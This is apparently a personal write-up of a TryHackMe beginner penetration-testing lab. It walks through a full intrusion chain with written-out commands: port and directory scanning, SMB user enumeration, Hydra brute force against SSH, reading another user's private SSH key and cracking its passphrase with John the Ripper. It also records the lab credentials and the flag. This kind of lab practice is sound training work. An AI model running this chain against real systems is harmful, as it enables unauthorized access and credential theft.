# Basic PenTesting

```bash
export IP=10.10.57.27
```


## Scans

### Nmap
Command:
```bash
nmap -sC -sV -oN scans/nmap.initial 10.10.57.27
```

Open Ports found:
```text
22 -- ssh
80 -- webpage
129 -- Samba
445 -- Samba
```

Hostname `BASIC2` 

### Gobuster

Command:
```bash
gobuster dir -w wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.57.27
```

Directories found:
```text
/development
```

### Enum4linux
Command:
```bash
enum4linux -a 10.10.57.27 | tee enum4linux.log
```

Users `kay` and `jan` found


## Hydra
Command:
```bash
hydra -l jan -P wordlists/rockyou.txt ssh://10.10.57.27 -t 4
```
and

```bash
hydra -l kay -P wordlists/rockyou.txt ssh://10.10.57.27 -t 4
```

credentials found: `jan:armando`


## SSH into Machine
```bash
ssh jan@10.10.57.27
```

### Linpeas
Command:
```bash
scp linpeas.sh jan@10.10.57.27:/dev/shm | tee linlog.txt
```

and on target machine:
```
cd /dev/shm
ls
./linpeas.sh
```

RSA key found:
```
jan@basic2:/home/kay/.ssh$ cat id_rsa
```

copied and pasted into `kay_id_rsa`, and marked as *read-only*:
```bash
chmod 600 kay_id_rsa
```

tried logging into ssh with `kay` user RSA key, but password protected

### JohnTheRipper

ssh2john.py to crack rsa key, and outputting to `forjohn.txt`
```bash
./ssh2john.py kay_id_rsa > forjohn.txt
```

JohnTheRipper on `forjohn.txt` with the `rockyou.txt` passwordlist
```bash
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

credentials found:`kay:beeswax`


SSH into the machine as `kay` user:
```bash
ssh -i kay_id_rsa kay@10.10.57.27
```

```
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
```

final flag found:`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`


---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
